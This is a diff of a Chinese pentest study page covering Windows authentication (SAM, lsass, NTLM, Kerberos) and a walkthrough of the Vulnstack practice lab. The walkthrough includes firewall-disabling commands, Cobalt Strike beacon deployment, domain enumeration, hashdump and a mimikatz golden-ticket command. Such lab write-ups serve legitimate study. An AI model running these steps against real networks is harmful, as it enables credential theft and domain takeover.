@@ -72,6 +72,7 @@
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20251118093914869.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20251118094240059.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20251118094415153.png">
+<meta property="og:image" content="http://laijunyue.github.io/images/image-20251123221407447.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20251118151027895.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20251118151057342.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20251118151118171.png">
@@ -86,7 +87,7 @@
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20251118151941717.png">
 <meta property="og:image" content="http://laijunyue.github.io/images/image-20251118152033796.png">
 <meta property="article:published_time" content="2025-11-04T01:35:22.000Z">
-<meta property="article:modified_time" content="2025-11-20T00:48:52.705Z">
+<meta property="article:modified_time" content="2025-11-24T06:11:02.208Z">
 <meta property="article:author" content="xiaolaisec">
 <meta property="article:tag" content="CS">
 <meta property="article:tag" content="MSF">
@@ -475,8 +476,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2025-11-20 08:48:52</span>
-            <span class="mobile">2025-11-20 08:48:52</span>
+            <span class="desktop">2025-11-24 14:11:02</span>
+            <span class="mobile">2025-11-24 14:11:02</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -533,13 +534,34 @@
             <h1 id="第一章-内网基础知识"><a href="#第一章-内网基础知识" class="headerlink" title="第一章 内网基础知识"></a>第一章 内网基础知识</h1><p>1.渗透的大致思路<br>信息收集-&gt;漏洞利用(主要是web漏洞)-&gt;权限提升-&gt;权限维持(反弹shell)-&gt;内网代理-&gt;内网渗透-&gt;痕迹清理(后渗透)</p>
 <p>2.内网渗透的大致思路<br>内网信息收集(防火墙，IP段，端口，定位域控，域用户，杀软)-&gt;内网漏洞利用-&gt;[[横向移动(重要)]]-&gt;跨域攻击</p>
 <p>3.什么是域(重要)<br>域可以说是升级版的工作组，由于工作组很灵活，不方便管理，没有[[统一的管理]]的管理，因此诞生了[[域]]，域可以理解为统一管理的一片主机区域，其中[[域控]]是域的最高管理员，只要是该域内的成员，无论做什么事情(加入域，退出域，以及下载软件)都要经过域控的批准(即域控的账号和密码)，才可以进行操作。域控可以分配域成员的身份和权限。每个域都有一个域名，一个域可以派生多个子域。</p>
-<h1 id="第二章-用户权限"><a href="#第二章-用户权限" class="headerlink" title="第二章 用户权限"></a><strong>第二章 用户权限</strong></h1><p>一.工作组权限<br>1.[[本地用户组]]<br>2.[[本地最高管理员权限(administrator)]]<br>3.[[本地普通管理员权限]]<br>4.[[本地普通用户]]<br>5.<a href="%E9%87%8D%E8%A6%81">[UAC认证是什么]</a></p>
+<h1 id="第二章-用户权限"><a href="#第二章-用户权限" class="headerlink" title="第二章 用户权限"></a><strong>第二章 用户权限</strong></h1><p>一.工作组权限<br>1.本地用户组<br>2.本地最高管理员权限(administrator)<br>3.本地普通管理员权限<br>4.本地普通用户<br>5.UAC认证是什么</p>
 <p>UAC(User Account Control 用户账户控制)，主要功能是 在进行一些会影响系统安全的[[高权限]]操作时，会自动触发UAC(即许可提示窗口)来提醒用户，用户确认后才能执行操作。</p>
 <p>UAC的触发条件:<br>1.修改Windows Update配置；<br>2.增加或删除用户帐户；<br>3.改变用户的帐户类型；<br>4.改变UAC设置；<br>5.安装ActiveX;；<br>6.安装或卸载程序；<br>7.安装设备驱动程序；<br>8.修改和设置家长控制；<br>9.增加或修改注册表；<br>10.将文件移动或复制到Program Files 或 Windows目录下；<br>11.访问其他用户目录</p>
-<p>UAC的四种设置：<br>1.始终通知；<br>2.仅在程序尝试对我的计算机进行更改时通知我；<br>3.仅当程序尝试对我的计算机进行更改时通知我(不降低桌面亮度)；<br>4.从不通知   [[ 就算设置不弹框，认证还是在，对于普通管理员只是省略了点击是的按                          钮；对于普通用户，还是会弹窗并且要输入超管的密码。]]</p>
-<p>Windows计算机可  Win+R 输入 msconfig 来设置UAC6.[[本地系统最高权限(system)]]</p>
-<p>二.域内机器权限<br>[[注意：]]机器加入到域之后可以选择使用域内用户登录，也可以使用本地用户登录，注意以下的区别<br>1）本地用户登录，用户信息是存放在本地文件中然后本机进行校验；域内用户登录，用户信息是通过DC域控的校验认证后才能登录，用户信息存放在域控上。<br>2）本地用户登录主要对比的是[[NTLM HASH值]]，域认证是通过[[kerberos认证]]。<br>3）机器可以选择本地登录或者域用户登录，本地用户登录：机器名\用户名 密码；域用户登录 域名\用户名 密码。</p>
-<p>1.[[域内用户组介绍]]<br>2.[[域内最高管理员权限]]<br>3.[[域内普通管理员权限]]<br>4.[[域内普通用户权限]]<br>5.<a href="%E9%87%8D%E8%A6%81">[机器用户和system关系]</a></p>
+<p>UAC的四种设置：<br>1.始终通知；<br>2.仅在程序尝试对我的计算机进行更改时通知我；<br>3.仅当程序尝试对我的计算机进行更改时通知我(不降低桌面亮度)；<br>4.从不通知   <code> 就算设置不弹框，认证还是在，对于普通管理员只是省略了点击是的按钮；对于普通用户，还是会弹窗并且要输入超管的密码。</code></p>
+<p>Windows计算机可  Win+R 输入 msconfig 来设置UAC6.<code>本地系统最高权限(system)</code></p>
+<p>二.域内机器权限<br>注意：机器加入到域之后可以选择使用域内用户登录，也可以使用本地用户登录，注意以下的区别<br>1）本地用户登录，用户信息是存放在本地文件中然后本机进行校验；域内用户登录，用户信息是通过DC域控的校验认证后才能登录，用户信息存放在域控上。<br>2）本地用户登录主要对比的是<code>NTLM HASH值</code>，域认证是通过<code>kerberos认证</code>。<br>3）机器可以选择本地登录或者域用户登录，本地用户登录：机器名\用户名 密码；域用户登录 域名\用户名 密码。</p>
+<p>1.域内用户组<br>2.域内最高管理员权限(目标)<br>3.域内普通管理员权限(提权)<br>4.域内普通用户权限<br>5.机器用户和system关系(提权)</p>
+<h1 id="第三章Windows认证机制和协议-重要"><a href="#第三章Windows认证机制和协议-重要" class="headerlink" title="第三章Windows认证机制和协议(重要)"></a>第三章Windows认证机制和协议(重要)</h1><h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><h3 id="1-本地认证概述"><a href="#1-本地认证概述" class="headerlink" title="(1)本地认证概述"></a>(1)本地认证概述</h3><p>电脑开机(winlogon.exe)–(账号密码)–&gt;Lsass.exe进程–和SAM文件中的密码对比–&gt;SAM文件</p>
+<p>Windows Logon Process (即winlogon.exe)是Windows NT 用户登录程序，用于管理用户登录和退出，且以system权限运行。用户注销、重启、锁屏后，操作系统会让winlogon.exe执行从而显示登陆界面。</p>
+<p>lsass.exe是一个系统进程，用于微软Windows系统的安全机制，进行本地安全和登录策略，即我们输入帐户密码后就会执行这个进程到<code>SAM文件</code>进行我们密码的认证。SAM文件是位于C:\Windows\System32\config\目录下，用于存储本地所有用户的凭证信息，但这并不代表你可以随时随意去查看系统密码。</p>
+<h3 id="2-SAM文件和lsass进程"><a href="#2-SAM文件和lsass进程" class="headerlink" title="(2)SAM文件和lsass进程"></a>(2)SAM文件和lsass进程</h3><p>SAM文件是Windows的用户帐户数据库，所有用户的登录名以及口令等相关信息都会保存在这个文件中，简单格式如下：<br>[[用户名称:LM-HASH值(用户明文密码经过LM-HASH加密后的值):NTLM-HASH值]]<br>如：administrator:BBBBD587519FE693CD83CABBA4F3AB17:77269418bfae986e554cff5de4fd59fe<br>SAM文件中的密码并不是以明文的形式存在，而是加密存储在SAM文件中</p>
+<p>Lsass.exe进程的作用非常重要，其主要负责管理[[本地安全策略和认证机制]]。这些策略包括密码策略、账户策略、用户权限、域策略等等。同时还负责对用户进行身份验证，以确保只有授权的用户才能访问系统资源。<br>重要作用<br>    1.将winlogon进程传过来的[[明文账号密码进行加密]]，然后和SAM文件中的[[密文账号密码做对比]]，如果对比成功就可以实现登录。<br>    2.将收到的明文账号密码在本地内存中保留一份做备用。</p>
+<p>(3)LM Hash加密步骤</p>
+<h3 id="4-本地认证中的安全问题"><a href="#4-本地认证中的安全问题" class="headerlink" title="(4)本地认证中的安全问题"></a>(4)本地认证中的安全问题</h3><p>1.如果控制了某台个人PC机，如何获得用户的明文账号密码？<br>2.在windows server 2012和windows8之后会有补丁，lsass.exe进程不会在内存存一份用户明文密码了，该怎么办？<br>3.我能否在验证用户身份的时候不经过lsass.exe进程直接通过用户明文密码加密后的HASH值与SAM文件中的加密密码进行对比？</p>
+<h2 id="网络认证"><a href="#网络认证" class="headerlink" title="网络认证"></a>网络认证</h2><h3 id="1-网络认证概述和介绍"><a href="#1-网络认证概述和介绍" class="headerlink" title="1.网络认证概述和介绍"></a>1.网络认证概述和介绍</h3><p>碰到工作组的计算机，主机A想访问主机B上的资源，就要向主机B发送一个存在于主机B的一个帐户，主机B接收以后会在本地进行验证，如果验证成功，才会允许主机A进行相应的访问。</p>
+<p>1.用户名和密码认证：这是最常见的认证方式，用户需要提供有效的用户名和密码，从而认证其身份。这种认证方式<code>适用于本地计算机账户</code>或<code>域账户</code>。</p>
+<p>2.<code>Kerberos认证(重点)</code>：Kerberos是一种网络身份验证协议，在<code>Windows域环境</code>中广泛使用。它通过使用<code>票据</code>和<code>票据授权票证(TGT)</code>来验证用户身份，并生成会话密钥用于加密通信。</p>
+<p>3.<code>NTLM认证(重点)</code>：NTLM(NT LAN Manager)是一种早期的Windows网络认证协议，它使用基于挑战-响应的方式进行身份验证。尽管Kerberos已经成为首选的认证协议，但NTLM仍然在某些情况下使用，特别是在与旧版Windows系统或非Windows系统进行交互操作时用到。</p>
+<p>4.密钥身份认证：Windows还支持使用密钥来进行身份认证。这种方式涉及使用预先共享的密钥来对用户进行身份验证，通常用于特定的场景和应用。</p>
+<p>5.远程桌面认证(Remote Desktop Authentication)：远程桌面是一种远程访问Windows计算机的功能。在远程桌面连接时，用户需要提供目标计算机的凭据进行认证，以验证身份并获得远程访问权限。</p>
+<p>2.NTLM协议挑战响应认证机制</p>
+<p>3.抓包流量分析NTLM协议</p>
+<p>4.Challenge和Response分析</p>
+<p>5.NTLMv1和LTLMv2的区别</p>
+<h3 id="6-NTLM协议安全问题"><a href="#6-NTLM协议安全问题" class="headerlink" title="6.NTLM协议安全问题"></a>6.NTLM协议安全问题</h3><p>A主机与B服务器进行NTLM认证，如果此时C主机抓取到了A与B之间认证的数据包，或者C伪造A发送认证数据包，此时B也会将C看成是自己的“朋友”，所以NTLM认证是存在安全问题的，最终的身份还是无法确定是否是“自己人”。</p>
+<p>1.PTH攻击(Hash传递)：因为NTLM协议认证过程中使用到用户的NTLM-hash值的计算，如果我们知道对方电脑的Hash值就可以进行PTH攻击<br>2.NET-NTLM hash relay攻击：NTLM中间人攻击，如果获得NET-NTLM v1 Hash，可以重放其hash值进行认证<br>3.NET-NTLM v1 v2 Hash破解：v1比较简单，容易破解使用DES，如果是v2就要使用md5碰撞的方式可以使用彩虹表或者暴力破解等方式，获取明文的账号密码</p>
+<h2 id="域Kerberos认证"><a href="#域Kerberos认证" class="headerlink" title="域Kerberos认证"></a>域Kerberos认证</h2><h3 id="1-Kerberos协议简介"><a href="#1-Kerberos协议简介" class="headerlink" title="1.Kerberos协议简介"></a>1.Kerberos协议简介</h3><p>Kerberos也是一种[[网络认证协议]]，其设计目标是通过密钥系统为 客户机&#x2F;服务器 应用程序提供强大的认证服务。该认证过程的实现[[不依赖于主机操作系统的认证]]，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下，Kerberos作为一种可信赖的第三方认证服务，是通过传统的密码技术(如：共享密钥)执行认证服务。</p>
+<p>简单来讲，Kerberos协议认证就是一个第三方认证机构，客户机&#x2F;服务器 双方并不需要去建立信任关系，他们之间是否信任直接去问这个第三方认证机构(Kerberos)就可以了。</p>
 <h1 id="红日靶场搭建与复现"><a href="#红日靶场搭建与复现" class="headerlink" title="红日靶场搭建与复现"></a>红日靶场搭建与复现</h1><p>地址：<a class="link"   target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/" >http://vulnstack.qiyuanxuetang.net/vuln/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <h2 id="靶场1"><a href="#靶场1" class="headerlink" title="靶场1"></a>靶场1</h2><p>环境链接：<a class="link"   target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" >http://vulnstack.qiyuanxuetang.net/vuln/detail/2/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <h3 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a><strong>搭建</strong></h3><p>下载靶场主机，，是虚拟机文件，直接用虚拟机打开就可以用了，但是需要配一下网段</p>
@@ -663,7 +685,7 @@
                       alt="image-20251113091308954"
                 ></p>
 <h3 id="内网攻击——CS上线"><a href="#内网攻击——CS上线" class="headerlink" title="内网攻击——CS上线"></a><strong>内网攻击——CS上线</strong></h3><p>关闭防火墙</p>
-<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows：netsh advfirewall set allprofiles state off</span><br><span class="line">linux：sudo systemctl stop firewalld </span><br></pre></td></tr></table></figure></div>
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">windows：#关闭防火墙:netsh advfirewall set allprofiles state off;#查看防火墙状态:netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">linux：sudo systemctl stop firewalld </span><br></pre></td></tr></table></figure></div>
 
 <p>启动CS，生成木马上传，用蚁剑运行即可上线</p>
 <p><img  
@@ -739,6 +761,8 @@
 <p><strong>会话中断</strong>：改用 <code>spawn</code> 代替 <code>inject</code> 或检查杀软拦截</p>
 </blockquote>
 <h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p><strong>一域二端三明文</strong></p>
+<div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br><span class="line"></span><br><span class="line">定位域控</span><br><span class="line">nltest /DCLIST:域名		# 查看域控机器名</span><br><span class="line">net group <span class="string">&quot;doamin controllers&quot;</span> /domain  # 查看域控制器主机名（可能有多台）</span><br></pre></td></tr></table></figure></div>
+
 <p>先来看一下权限，如果权限是普通的admin权限的话我们使用<code>getsystem</code>来提升到<code>system权限</code></p>
 <p><img  
                      lazyload
@@ -753,8 +777,6 @@
                      data-src="/../images/image-20251117095611002.png"
                       alt="image-20251117095611002"
                 ></p>
-<div class="highlight-container" data-rel="Css"><figure class="iseeu highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">net view                 # 查看局域网内其他主机名</span><br><span class="line">net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 # 查看本机用户列表</span><br><span class="line">net user /domain         # 查看域用户</span><br><span class="line">net localgroup administrators # 查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         # 查看有几个域</span><br><span class="line">net user 用户名 /domain   # 获取指定域用户的信息</span><br><span class="line">net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    # 查看域中某工作组</span><br><span class="line">net group &quot;domain admins&quot; /domain  # 查看域管理员的名字</span><br><span class="line">net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名</span><br><span class="line">net group &quot;doamin controllers&quot; /domain  # 查看域控制器主机名（可能有多台）</span><br></pre></td></tr></table></figure></div>
-
 <p>看一下这个主机的域是哪个后缀，也就是根域名</p>
 <p><img  
                      lazyload
@@ -887,7 +909,16 @@
                       alt="image-20251118094415153"
                 ></p>
 <p>由此成功能控制整个域了，但是这还不够，我们来制作我们的黄金票据</p>
-<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><blockquote>
+<h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>制作黄金票据需要四个东西</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#查看krbtgt值（黄金票据之一）</span><br><span class="line">hashdump</span><br><span class="line"></span><br><span class="line">#查看sid（黄金票据之一）</span><br><span class="line">shell whoami /all</span><br><span class="line"></span><br><span class="line">#查看域名（黄金票据之一）</span><br><span class="line">shell ipconfig /all</span><br><span class="line"></span><br><span class="line">#查看用户名（黄金票据之一)</span><br><span class="line">net user</span><br><span class="line"></span><br><span class="line">#切换到C盘创建</span><br><span class="line">cd C:\</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251123221407447.png"
+                      alt="image-20251123221407447"
+                ></p>
+<blockquote>
 <p><strong>黄金票据就是当你被下线后，而你此时成功掌控了一个可访问内网电脑，你就可以上传这个票据，在使用命令使用，你就可以恢复你域掌控者的身份了</strong></p>
 <p>生成票据：</p>
 <p><code>mimikatz Kerberos::golden /user:XXX /domain:xxxxx /sid:xxxxx… /krbtgt:krbtgt的hash值 /ticket:ticket.kirbi</code></p>
@@ -1008,7 +1039,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2025-11-20 08:48:52
+                    :</strong> 2025-11-24 14:11:02
             </li>
         
         <li>
@@ -1147,7 +1178,7 @@
     <div class="post-toc">
         <div class="toc-title">On this page</div>
         <div class="page-title">内网安全 专题</div>
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">第一章 内网基础知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="nav-text">第二章 用户权限</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0"><span class="nav-text">红日靶场搭建与复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA1"><span class="nav-text">靶场1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA"><span class="nav-text">搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4"><span class="nav-text">web外网突破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94CS%E4%B8%8A%E7%BA%BF"><span class="nav-text">内网攻击——CS上线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">内网信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E5%93%88%E5%B8%8C%E7%A0%81%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-text">横向移动&amp;哈希码横向移动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-text">黄金票据</span></a></li></ol></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">第一章 内网基础知识</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="nav-text">第二章 用户权限</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E7%AB%A0Windows%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E5%92%8C%E5%8D%8F%E8%AE%AE-%E9%87%8D%E8%A6%81"><span class="nav-text">第三章Windows认证机制和协议(重要)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81"><span class="nav-text">本地认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E6%A6%82%E8%BF%B0"><span class="nav-text">(1)本地认证概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-SAM%E6%96%87%E4%BB%B6%E5%92%8Clsass%E8%BF%9B%E7%A8%8B"><span class="nav-text">(2)SAM文件和lsass进程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E6%9C%AC%E5%9C%B0%E8%AE%A4%E8%AF%81%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-text">(4)本地认证中的安全问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81"><span class="nav-text">网络认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%BD%91%E7%BB%9C%E8%AE%A4%E8%AF%81%E6%A6%82%E8%BF%B0%E5%92%8C%E4%BB%8B%E7%BB%8D"><span class="nav-text">1.网络认证概述和介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-NTLM%E5%8D%8F%E8%AE%AE%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="nav-text">6.NTLM协议安全问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%9FKerberos%E8%AE%A4%E8%AF%81"><span class="nav-text">域Kerberos认证</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Kerberos%E5%8D%8F%E8%AE%AE%E7%AE%80%E4%BB%8B"><span class="nav-text">1.Kerberos协议简介</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%A4%8D%E7%8E%B0"><span class="nav-text">红日靶场搭建与复现</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%9D%B6%E5%9C%BA1"><span class="nav-text">靶场1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%90%AD%E5%BB%BA"><span class="nav-text">搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web%E5%A4%96%E7%BD%91%E7%AA%81%E7%A0%B4"><span class="nav-text">web外网突破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94CS%E4%B8%8A%E7%BA%BF"><span class="nav-text">内网攻击——CS上线</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">内网信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-%E5%93%88%E5%B8%8C%E7%A0%81%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="nav-text">横向移动&amp;哈希码横向移动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-text">黄金票据</span></a></li></ol></li></ol></li></ol>
 
     </div>
 </div>
